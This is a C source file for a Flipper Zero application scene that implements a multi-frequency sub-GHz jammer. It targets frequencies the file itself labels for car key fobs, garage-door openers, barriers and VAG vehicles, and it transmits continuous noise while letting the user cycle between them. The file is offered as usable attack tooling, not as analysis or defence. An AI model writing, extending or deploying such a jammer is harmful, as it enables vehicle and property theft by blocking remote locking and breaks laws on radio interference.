// scenes/protopirate_scene_jam.c — Multi-frequency jammer
#include "../protopirate_app_i.h"
#include <lib/subghz/devices/devices.h>
#include <lib/subghz/transmitter.h>

#define TAG "Jammer"

typedef struct {
    SubGhzTransmitter* transmitter;
    FlipperFormat* ff;
    uint32_t frequency;
    bool active;
} JamContext;

static JamContext* jam_ctx = NULL;

// Common jamming frequencies
static const uint32_t JAM_FREQS[] = {
    315000000,  // USA cars
    390000000,  // Chamberlain/LiftMaster
    433920000,  // Europe cars + barriers
    434420000,  // VAG
    868000000,  // Hormann/Somfy
};
#define JAM_FREQ_COUNT (sizeof(JAM_FREQS)/sizeof(JAM_FREQS[0]))
static uint8_t jam_freq_index = 2; // Default 433.92

static void jam_stop_transmitter(void) {
    if(jam_ctx && jam_ctx->transmitter) {
        subghz_transmitter_stop(jam_ctx->transmitter);
        subghz_transmitter_free(jam_ctx->transmitter);
        jam_ctx->transmitter = NULL;
    }
}

void protopirate_scene_jam_on_enter(void* context) {
    ProtoPirateApp* app = context;
    
    // Cleanup previous
    if(jam_ctx) {
        jam_stop_transmitter();
        if(jam_ctx->ff) flipper_format_free(jam_ctx->ff);
        free(jam_ctx);
    }

    jam_ctx = malloc(sizeof(JamContext));
    memset(jam_ctx, 0, sizeof(JamContext));
    jam_ctx->frequency = JAM_FREQS[jam_freq_index];

    if(!protopirate_radio_init(app)) {
        notification_message(app->notifications, &sequence_error);
        free(jam_ctx); jam_ctx = NULL;
        scene_manager_previous_scene(app->scene_manager);
        return;
    }

    // Build noise pattern
    jam_ctx->ff = flipper_format_string_alloc();
    flipper_format_write_string_cstr(jam_ctx->ff, "Protocol", "RAW");
    flipper_format_write_comment_cstr(jam_ctx->ff, "Multi-freq jammer");
    
    FuriString* raw = furi_string_alloc();
    for(int i = 0; i < 200; i++) {
        furi_string_cat_printf(raw,
            "300 -300 600 -600 400 -400 500 -500 350 -350 550 -550 "
            "300 -300 700 -700 450 -450 650 -650 500 -500 400 -400 "
            "550 -550 350 -350 300 -300 600 -600 450 -450 700 -700 ");
    }
    flipper_format_write_string_cstr(jam_ctx->ff, "RAW_Data", furi_string_get_cstr(raw));
    furi_string_free(raw);

    // Allocate + start transmitter at selected frequency
    jam_ctx->transmitter = subghz_transmitter_alloc_init(app->txrx->environment, "AM650");
    if(!jam_ctx->transmitter) goto fail;
    
    subghz_transmitter_deserialize(jam_ctx->transmitter, jam_ctx->ff);

    if(!subghz_devices_start_async_tx(app->txrx->radio_device,
        subghz_transmitter_yield, jam_ctx->transmitter)) goto fail;

    app->txrx->txrx_state = ProtoPirateTxRxStateTx;
    jam_ctx->active = true;

    // Display
    char info[128];
    snprintf(info, sizeof(info),
        "JAMMING %lu MHz\n\nTX active - noise\n200 cycles\n\nUP/DOWN: change freq\nBACK: stop\n\n"
        "Freqs: 315/390/433/434/868",
        jam_ctx->frequency / 1000000);
    widget_reset(app->widget);
    widget_add_text_scroll_element(app->widget, 0, 0, 128, 64, info);
    view_dispatcher_switch_to_view(app->view_dispatcher, ProtoPirateViewWidget);
    return;

fail:
    notification_message(app->notifications, &sequence_error);
    if(jam_ctx) { free(jam_ctx); jam_ctx = NULL; }
    scene_manager_previous_scene(app->scene_manager);
}

bool protopirate_scene_jam_on_event(void* context, SceneManagerEvent event) {
    ProtoPirateApp* app = context;
    if(event.type == SceneManagerEventTypeCustom && jam_ctx) {
        // Switch frequency without stopping jam
        jam_freq_index = (jam_freq_index + 1) % JAM_FREQ_COUNT;
        jam_ctx->frequency = JAM_FREQS[jam_freq_index];
        
        // Restart transmitter at new frequency
        jam_stop_transmitter();
        jam_ctx->transmitter = subghz_transmitter_alloc_init(app->txrx->environment, "AM650");
        if(jam_ctx->transmitter) {
            FlipperFormat* ff = flipper_format_string_alloc();
            flipper_format_write_string_cstr(ff, "Protocol", "RAW");
            flipper_format_write_string_cstr(ff, "RAW_Data", 
                "300 -300 600 -600 400 -400 500 -500 ");
            subghz_transmitter_deserialize(jam_ctx->transmitter, ff);
            flipper_format_free(ff);
            subghz_devices_start_async_tx(app->txrx->radio_device,
                subghz_transmitter_yield, jam_ctx->transmitter);
        }
        
        // Update display
        char info[128];
        snprintf(info, sizeof(info),
            "JAMMING %lu MHz\n\nTX active\nUP/DOWN: next freq\nBACK: stop",
            jam_ctx->frequency / 1000000);
        widget_reset(app->widget);
        widget_add_text_scroll_element(app->widget, 0, 0, 128, 64, info);
        view_dispatcher_switch_to_view(app->view_dispatcher, ProtoPirateViewWidget);
        return true;
    }
    return false;
}

void protopirate_scene_jam_on_exit(void* context) {
    ProtoPirateApp* app = context;
    if(jam_ctx) {
        jam_stop_transmitter();
        if(jam_ctx->ff) flipper_format_free(jam_ctx->ff);
        free(jam_ctx);
        jam_ctx = NULL;
    }
    if(app && app->txrx) {
        app->txrx->txrx_state = ProtoPirateTxRxStateIDLE;
        subghz_devices_idle(app->txrx->radio_device);
    }
}
